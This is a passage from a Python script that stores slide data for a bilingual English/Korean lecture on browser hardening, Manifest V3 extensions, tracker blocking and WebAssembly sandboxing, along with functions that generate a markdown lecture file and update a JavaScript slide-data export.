        "koreanGuide": {
            "summary": "라이프 OS 요새화된 브라우저 콕핏: 듀얼 브라우저 전략과 미니멀 확장 다이어트",
            "points": [
                "듀얼 브라우저 운용: 광고 없는 딥 리서치용 브레이브/파이어폭스 + 구글 워크스페이스용 크롬 엔터프라이즈",
                "확장 프로그램 다이어트: 활성 확장을 5개 미만의 검증된 오픈소스 MV3 유틸리티로 엄격 제한",
                "오프라인 로컬 AI: 100% 오프라인으로 돌아가는 인브라우저 WebAssembly 요약 도구 상시 활용"
            ],
            "tips": "사라 조교와 제임스 조교가 실전 연구와 업무를 위한 듀얼 브라우저 세팅 노하우를 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Dual-Browser Strategy",
                "def": "Segmenting web activities across distinct specialized browser runtimes to maximize security and productivity.",
                "defKo": "듀얼 브라우저 분할 전략"
            },
            {
                "term": "Extension Diet",
                "def": "The disciplined minimization of active browser extensions to reduce memory footprint and attack surface.",
                "defKo": "확장 프로그램 다이어트 (최소화 원칙)"
            }
        ]
    },
    # Slide 40: The Architect's Ethical Mandate
    {
        "num": 40,
        "type": "content",
        "title": "THE ARCHITECT'S ETHICAL MANDATE",
        "subtitle": "Building technology that respects human cognitive sanctuary and refuses digital exploitation",
        "points": [
            "Resisting Exploitation: Refusing to build software that tricks users, steals data, or manipulates behavior.",
            "Defending the Sanctuary: Treating human attention as sacred cognitive space worthy of protection.",
            "Eternal Calling: Dedicating all computational mastery to the service of God and human flourishing."
        ],
        "script": (
            "[Prof. Peter] Slide 40 reflects on \"THE ARCHITECT'S ETHICAL MANDATE.\" Software engineering is a moral endeavor.\n\n"
            "[TA Sarah] When we graduate as Intelligence Architects, we carry a sacred duty: we will never build dark patterns, we will never write predatory tracking scripts, and we will never design systems that enslave human attention!\n\n"
            "[TA James] We build systems that liberate, protect, and empower human beings to achieve their highest divine potential!\n\n"
            "[Prof. Peter] Let us inspect our capstone enterprise case study on Slide 44!"
        ),
        "koreanGuide": {
            "summary": "지능 건축가의 윤리적 사명: 인간 인지 안식처의 존중과 디지털 착취 거부",
            "points": [
                "착취에 대한 저항: 사용자를 속이고 데이터를 훔치며 주의력을 조작하는 소프트웨어 개발 단호히 거부",
                "안식처 수호: 인간의 집중력과 정신을 보호받아야 할 신성한 인지적 공간으로 대우",
                "영원한 소명: 모든 공학적 지식과 역량을 하나님을 섬기고 이웃을 세우는 데 헌신"
            ],
            "tips": "피터 교수가 졸업생들이 지녀야 할 직업 윤리와 인간 존중의 숭고한 사명을 역설합니다."
        },
        "keyTerms": [
            {
                "term": "Ethical Engineering Mandate",
                "def": "The professional commitment to creating software systems that honor human autonomy, truthfulness, and dignity.",
                "defKo": "윤리적 공학 사명"
            },
            {
                "term": "Cognitive Sanctuary Defense",
                "def": "The architectural preservation of human mental focus against aggressive algorithmic intrusion.",
                "defKo": "인지 안식처 수호"
            }
        ]
    },
    # Slide 41: Project Evaluation Rubric for Session 9
    {
        "num": 41,
        "type": "content",
        "title": "PROJECT EVALUATION RUBRIC FOR SESSION 9",
        "subtitle": "Grading criteria: Manifest V3 validity (30%), DNR rule efficiency (30%), Wasm sandbox isolation (40%)",
        "points": [
            "Criterion 1 (30%): Valid `manifest.json` conforming strictly to Manifest V3 service worker specifications.",
            "Criterion 2 (30%): Efficient `declarativeNetRequest` rules blocking target telemetry with zero syntax errors.",
            "Criterion 3 (40%): Sandboxed WebAssembly execution demonstrating strict memory isolation and zero DOM access."
        ],
        "script": (
            "[TA Sarah] Slide 41 presents our \"PROJECT EVALUATION RUBRIC FOR SESSION 9.\"\n\n"
            "[TA James] Your lab submission will be graded on 3 core criteria: 30% for Manifest V3 specification conformance. 30% for declarativeNetRequest rule efficiency. And 40% for WebAssembly sandbox memory isolation with zero leaks!\n\n"
            "[Prof. Peter] Rigorous grading standards prepare you to build ironclad commercial software.\n\n"
            "[TA Sarah] Let us inspect the Next Horizon: Antigravity 2.0 on Slide 42!"
        ),
        "koreanGuide": {
            "summary": "Session 9 프로젝트 평가 루브릭: MV3 규격(30%), DNR 규칙(30%), Wasm 격리(40%)",
            "points": [
                "기준 1 (30%): 매니페스트 V3 서비스 워커 표준을 완벽 준수하는 manifest.json 작성",
                "기준 2 (30%): 오차 없이 텔레메트리를 차단하는 효율적인 DNR 선언적 규칙 구성",
                "기준 3 (40%): DOM 접근이 원천 차단되고 메모리 경계가 격리된 WebAssembly 실행 실증"
            ],
            "tips": "제임스 조교가 실습 평가의 3대 핵심 포인트를 명확하게 안내합니다."
        },
        "keyTerms": [
            {
                "term": "Grading Rubric",
                "def": "A structured assessment matrix defining performance expectations and scoring criteria for engineering assignments.",
                "defKo": "프로젝트 평가 루브릭"
            },
            {
                "term": "Sandbox Isolation Proof",
                "def": "Empirical verification demonstrating that client-side code cannot access unauthorized host APIs or DOM structures.",
                "defKo": "샌드박스 완전 격리 실증"
            }
        ]
    },
    # Slide 42: Next Horizon: Antigravity 2.0 & Autonomous Swarms
    {
        "num": 42,
        "type": "content",
        "title": "NEXT HORIZON: ANTIGRAVITY 2.0 & SWARMS",
        "subtitle": "Connecting browser sandboxes to massive 93-agent swarms, subagent spawning, and autonomous coding",
        "points": [
            "From Single Browser to Agent Swarms: Transitioning from client-side execution to distributed multi-agent swarms.",
            "Antigravity 2.0 Architecture: Spawning 93 specialized subagents to refactor enterprise repositories in parallel.",
            "Session 10 Preview: Autonomous verification loops, sidecar orchestrators, and high-concurrency swarms."
        ],
        "script": (
            "[TA Sarah] Slide 42 previews our next exciting frontier: \"NEXT HORIZON: ANTIGRAVITY 2.0 & AUTONOMOUS SWARMS.\"\n\n"
            "[TA James] In Session 10, we make a massive leap: from a single browser sandbox to distributed swarms of 93 autonomous agents operating in parallel! We will deconstruct Google Antigravity 2.0, multi-agent spawning, and background subagent task management!\n\n"
            "[Prof. Peter] In Session 10, you become the Supreme Conductor of an entire army of artificial intelligence engineers.\n\n"
            "[TA Sarah] Let us inspect the Architect's Unshakeable Integrity on Slide 43!"
        ),
        "koreanGuide": {
            "summary": "다음 지평 예고: Session 10 Antigravity 2.0 및 93개 자율 에이전트 스웜",
            "points": [
                "단일 브라우저에서 분산 스웜으로: 클라이언트 단일 실행에서 93개 전문 에이전트 분산 협업으로의 대도약",
                "Antigravity 2.0 아키텍처: 대규모 엔터프라이즈 코드베이스를 병렬 리팩토링하는 서브에이전트 군단",
                "Session 10 연계: 자율 검증 루프, 사이드카 오케스트레이터, 고동시성 에이전트 지휘 예고"
            ],
            "tips": "사라 조교와 제임스 조교가 다음 강의(Session 10)에서 다룰 Antigravity 2.0 스웜의 거대한 스케일을 예고합니다."
        },
        "keyTerms": [
            {
                "term": "Antigravity 2.0 Swarm",
                "def": "Google's advanced multi-agent development platform orchestrating dozens of autonomous subagents in parallel.",
                "defKo": "Antigravity 2.0 멀티 에이전트 스웜"
            },
            {
                "term": "Subagent Concurrency",
                "def": "The simultaneous execution of specialized AI agents coordinating via structured message buses.",
                "defKo": "서브에이전트 동시성 지휘"
            }
        ]
    },
    # Slide 43: The Architect's Unshakeable Integrity
    {
        "num": 43,
        "type": "content",
        "title": "THE ARCHITECT'S UNSHAKEABLE INTEGRITY",
        "subtitle": "Standing as an uncompromising guardian of truth, privacy, and security in an era of platform monopolies",
        "points": [
            "The True Guardian: Refusing to build software that sacrifices user safety or creates hidden backdoors.",
            "Architectural Invariants: Defending memory safety, cryptographic signatures, and user consent at all costs.",
            "Excellence as Worship: Building software systems that reflect divine order, beauty, and justice."
        ],
        "script": (
            "[Prof. Peter] Slide 43 reflects on \"THE ARCHITECT'S UNSHAKEABLE INTEGRITY.\" In a world of platform monopolies, character is our greatest asset.\n\n"
            "[TA Sarah] When platform giants prioritize ad revenues over user privacy, the Intelligence Architect stands as the unshakeable guardian of user rights and data security.\n\n"
            "[TA James] We build software that is transparent, secure, and worthy of absolute trust.\n\n"
            "[Prof. Peter] Let us inspect our capstone enterprise case study on Slide 44!"
        ),
        "koreanGuide": {
            "summary": "지능 건축가의 흔들리지 않는 진실성: 플랫폼 독점 시대 속 진리와 프라이버시의 수호자",
            "points": [
                "진정한 수호자: 사용자의 안전을 희생하거나 숨겨진 백도어를 심는 타협을 결단코 거부",
                "아키텍처 불변성: 메모리 안전, 암호 서명, 사용자 동의라는 핵심 가치를 어떤 압력 속에서도 수호",
                "예배로서의 탁월성: 하나님의 질서와 아름다움, 정의를 반영하는 소프트웨어 시스템 구축"
            ],
            "tips": "피터 교수가 흔들리지 않는 공학적 진실성과 인격의 중요성을 감동적으로 선포합니다."
        },
        "keyTerms": [
            {
                "term": "Unshakeable Integrity",
                "def": "The ethical steadfastness to maintain uncompromising security and privacy standards under all circumstances.",
                "defKo": "흔들리지 않는 공학적 진실성"
            },
            {
                "term": "Platform Monopoly Defense",
                "def": "Architectural strategies safeguarding user autonomy and open standards against closed commercial platform dominance.",
                "defKo": "플랫폼 독점 대항 주권 수호"
            }
        ]
    },
    # Slide 44: Case Study 5: Zero-Trust Enterprise Browser Hardening Blueprint
    {
        "num": 44,
        "type": "casestudy",
        "title": "CASE STUDY 5: ENTERPRISE BROWSER HARDENING",
        "subtitle": "Defense Aerospace Enterprise hardens 25,000 engineer browser endpoints across 14 global sites",
        "company": "Global Defense & Aerospace Contractor",
        "problem": "Company faced 120 targeted nation-state phishing and extension supply-chain attacks monthly; browser RAM crashes caused 15,000 lost engineering hours annually.",
        "solution": "Deployed complete 6-step zero-trust browser hardening: Site Isolation, MV3 extension lockdown, DNR telemetry blocking, and local Wasm AI summarizers.",
        "impact": "Zero successful phishing breaches over 18 months; browser crash rate dropped by 92%; saved $6.4M in engineering productivity; 100% defense compliance.",
        "script": (
            "[Prof. Peter] Slide 44 presents our capstone enterprise case study: \"CASE STUDY 5: ENTERPRISE BROWSER HARDENING BLUEPRINT.\"\n\n"
            "[TA Sarah] A global defense and aerospace contractor with 25,000 aerospace engineers was targeted by 120 sophisticated nation-state phishing attacks every month. Furthermore, bloated extensions were causing browser crashes that wasted 15,000 engineering hours a year!\n\n"
            "[TA James] They deployed our complete 6-step Zero-Trust Browser Hardening Blueprint: Enforcing Site Isolation across all 25,000 laptops, locking down the extension whitelist to audited MV3 extensions, configuring DNR blocking, and deploying local WebAssembly AI models for classified document analysis!\n\n"
            "[Prof. Peter] Look at the enterprise results: zero successful phishing breaches over 18 months! Browser crash rates plunged by 92%, saving 6.4 million dollars in engineering productivity, while achieving 100% defense security compliance!\n\n"
            "[TA Sarah] That is the ultimate enterprise transformation.\n\n"
            "[TA James] Now let us audit your own Manifest V3 extension in Lab 9 on Slide 45!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 5: 방산 항공 대기업 25,000대 단말기 제로 트러스트 브라우저 요새화",
            "points": [
                "문제 상황: 매월 120건의 국가 배후 피싱 공격에 노출, 브라우저 렉과 충돌로 연간 15,000시간 엔지니어링 손실",
                "솔루션: 6단계 제로 트러스트 하드닝(사이트 격리, MV3 확장 잠금, DNR 텔레메트리 차단, 로컬 Wasm AI 배포)",
                "성과: 18개월간 피싱 침해 0건, 브라우저 다운 92% 급감, 연간 640만 달러 생산성 절감, 방산 보안 규격 100% 통과"
            ],
            "tips": "사라 조교와 제임스 조교가 25,000대 엔터프라이즈 단말기 요새화의 압도적 성과를 전하며 실습으로 유도합니다."
        },
        "keyTerms": [
            {
                "term": "Zero-Trust Browser Hardening",
                "def": "The comprehensive fortification of enterprise web client runtimes through policy lockdown, sandboxing, and telemetry suppression.",
                "defKo": "제로 트러스트 브라우저 요새화"
            },
            {
                "term": "Crash Rate Compression",
                "def": "The radical reduction in application crashes achieved by migrating from bloated legacy background pages to ephemeral workers.",
                "defKo": "브라우저 충돌률 극적 감축"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 45: Hands-on Lab 9 & Conclusion
    {
        "num": 45,
        "type": "lab",
        "title": "🛠️ HANDS-ON LAB 9 & CONCLUSION",
        "subtitle": "Auditing and Hardening a Manifest V3 Browser Agent Extension",
        "mission": "Construct a hardened Manifest V3 browser extension with an Ephemeral Service Worker, implement a `declarativeNetRequest` rule to block third-party trackers, integrate a sandboxed WebAssembly module, and audit execution in Chrome Developer Tools.",
        "steps": [
            "Step 1: Write a strict `manifest.json` conforming to Manifest V3 with `background.service_worker`.",
            "Step 2: Define a `rules.json` declarativeNetRequest file blocking 5 tracking and telemetry domains.",
            "Step 3: Compile a lightweight C++/Rust function to WebAssembly and load it inside the extension sandbox.",
            "Step 4: Load the unpacked extension into Chrome, open `chrome://serviceworker-internals`, and verify lifecycle termination after 30 seconds idle.",
            "Step 5: Navigate to a test page, verify that telemetry requests are dropped with 0ms lag, and export the audited package!"
        ],
        "script": (
            "[TA Sarah] Here we are at Slide 45: \"🛠️ HANDS-ON LAB 9 & SESSION CONCLUSION!\"\n\n"
            "[TA James] Tonight's hands-on lab puts you in the driver's seat of browser engineering! Step 1: Write your Manifest V3 `manifest.json`. Step 2: Build a DNR `rules.json` file blocking trackers. Step 3: Load a sandboxed WebAssembly module. Step 4: Inspect `chrome://serviceworker-internals` and verify that your service worker terminates after 30 seconds idle! Step 5: Test wire-speed packet dropping and export your hardened extension!\n\n"
            "[Prof. Peter] Once you understand how to build and harden software inside the browser kernel, you possess the keys to modern web security.\n\n"
            "[TA Sarah] In our next session, Session 10, we unleash the true power of autonomous development: Antigravity 2.0 and 93-Agent Swarms!\n\n"
            "[Prof. Peter] On behalf of TA Sarah Jenkins, TA James Wilson, and the entire Smart Insight Lab, congratulations on mastering Session 9! Soli Deo Gloria, and we will see you in Session 10!"
        ),
        "koreanGuide": {
            "summary": "실습 과제 9 및 세션 마무리: 매니페스트 V3 기반 보안 요새 확장 프로그램 제작 및 감사",
            "points": [
                "실습 미션: 단명 서비스 워커와 DNR 규칙을 탑재한 Manifest V3 확장 프로그램 제작",
                "Wasm 샌드박스 모듈 로드 및 chrome://serviceworker-internals에서 30초 유휴 시 자동 종료 실증",
                "0ms 와이어 스피드 텔레메트리 차단 확인 및 프로덕션 패키지 내보내기"
            ],
            "tips": "3인의 강사진이 오늘 수업의 성취를 축하하고 다음 세션(Session 10: Antigravity 2.0 & 93개 에이전트 스웜)에 대한 기대감을 최고조로 높이며 마무리합니다."
        },
        "keyTerms": [
            {
                "term": "Hands-on Milestone",
                "def": "The practical engineering completion of a functioning technical artifact fulfilling the session's learning objectives.",
                "defKo": "실습 달성 마일스톤"
            },
            {
                "term": "Manifest V3 Hardened Extension",
                "def": "A production-grade browser extension engineered to maximize security, privacy, and zero-idle resource consumption.",
                "defKo": "요새화된 매니페스트 V3 확장 프로그램"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    }
]

def generate_session9_md(slides):
    lines = []
    lines.append("# Session 9: Browser Security Fortress: Demystifying Chrome V8 Engine & Manifest V3's Ad-Blocker Suppression")
    lines.append("**Course:** The Architect of Intelligence: Mastering Agentic IT & Strategic Wisdom  ")
    lines.append("**Instructors:** Professor Peter Kim (Director), TA Sarah Jenkins (Senior AI Fellow) & TA James Wilson (DevOps TA) • Oikos University (www.oikos.edu)  ")
    lines.append("**Lecture Format:** Full 75-Minute Broadcast Trio Master Dialogue (4x Modules with 5 Enterprise Case Studies)  ")
    lines.append("**Total Slides:** 45 Slides (Expanded Multi-Presenter Master Edition)  ")
    lines.append("**Motto:** Soli Deo Gloria  ")
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append("## 📌 Table of Contents (목차)")
    
    for s in slides:
        num_str = f"{s['num']:02d}"
        title = s['title']
        slug = f"slide-{num_str}-{title.lower().replace(' ', '-').replace(':', '').replace('.', '').replace('&', 'and').replace('(', '').replace(')', '').replace('•', '').replace('\'', '').replace('’', '').replace('/', '-')}"
        slug = re.sub(r'-+', '-', slug).strip('-')
        lines.append(f"- [Slide {num_str}: {title}](#{slug})")
        
    lines.append("")
    lines.append("---")
    lines.append("")
    
    for s in slides:
        num_str = f"{s['num']:02d}"
        lines.append(f"## Slide {num_str}: {s['title']}")
        if s.get('subtitle'):
            lines.append(f"**Subtitle:** {s['subtitle']}")
        lines.append(f"**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab")
        lines.append("")
        
        lines.append("### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)")
        lines.append(s['script'])
        lines.append("")
        
        lines.append("### 🇰🇷 한국어 강의 가이드 및 핵심 요약")
        kg = s['koreanGuide']
        lines.append(f"**개요 요약:** {kg['summary']}")
        lines.append("")
        lines.append("**핵심 티칭 포인트:**")
        for pt in kg.get('points', []):
            lines.append(f"- {pt}")
        lines.append("")
        lines.append(f"**강의 전달 팁:** {kg.get('tips', '')}")
        lines.append("")
        
        if s.get('keyTerms'):
            lines.append("### 📚 Key Technical Terms (핵심 용어)")
            for kt in s['keyTerms']:
                lines.append(f"- **{kt['term']}** ({kt['defKo']}): {kt['def']}")
            lines.append("")
            
        lines.append("---")
        lines.append("")
        
    return "\n".join(lines)

def update_slides_data_js(slides):
    with open(SLIDES_DATA_JS, 'r', encoding='utf-8') as f:
        content = f.read()

    slides_json = json.dumps(slides, ensure_ascii=False, indent=2)
    new_export = f"export const SLIDES_SESSION_9 = {slides_json};"
    
    pattern = r"export\s+const\s+SLIDES_SESSION_9\s*=\s*\[[\s\S]*?\];"
    if re.search(pattern, content):
        updated_content = re.sub(pattern, lambda m: new_export, content, count=1)
        with open(SLIDES_DATA_JS, 'w', encoding='utf-8') as f:
            f.write(updated_content)
        print("Successfully updated SLIDES_SESSION_9 in slidesData.js!")
    else:
        print("Could not find SLIDES_SESSION_9 pattern in slidesData.js!")

def main():
    print(f"Total slides configured: {len(SLIDES_45_SESSION_9)}")
    
    # Verify part dividers
    part_slides = [s for s in SLIDES_45_SESSION_9 if s['type'] == 'section']
    print(f"Total PART Section Slides: {len(part_slides)}")
    for ps in part_slides:
        print(f"  Slide {ps['num']:02d}: {ps['title']}")
        
    # Verify case studies
    case_slides = [s for s in SLIDES_45_SESSION_9 if 'CASE STUDY' in s['title']]
    print(f"Total Case Study Slides: {len(case_slides)}")
    for cs in case_slides:
        print(f"  Slide {cs['num']:02d}: {cs['title']}")

    # 1. Write session9.md
    session9_md_content = generate_session9_md(SLIDES_45_SESSION_9)
    with open(SESSION9_MD, 'w', encoding='utf-8') as f:
        f.write(session9_md_content)
    print(f"Successfully generated and saved {SESSION9_MD} ({len(session9_md_content)} bytes)")
    
    # 2. Update slidesData.js
    update_slides_data_js(SLIDES_45_SESSION_9)
    
    print("Session 9 generation completed successfully!")

if __name__ == '__main__':
    main()
